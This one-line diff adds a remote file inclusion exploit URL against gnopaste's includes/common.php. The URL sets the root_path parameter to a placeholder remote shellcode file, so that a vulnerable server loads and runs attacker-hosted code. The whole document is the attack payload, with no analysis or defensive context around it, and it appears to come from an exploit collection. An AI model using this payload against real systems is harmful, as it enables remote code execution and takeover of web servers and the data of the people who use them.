@@ -1,0 +1,1 @@
+http://www.example.com/[gnopaste_path]/includes/common.php?root_path=SHELLCODE_URL.txt?
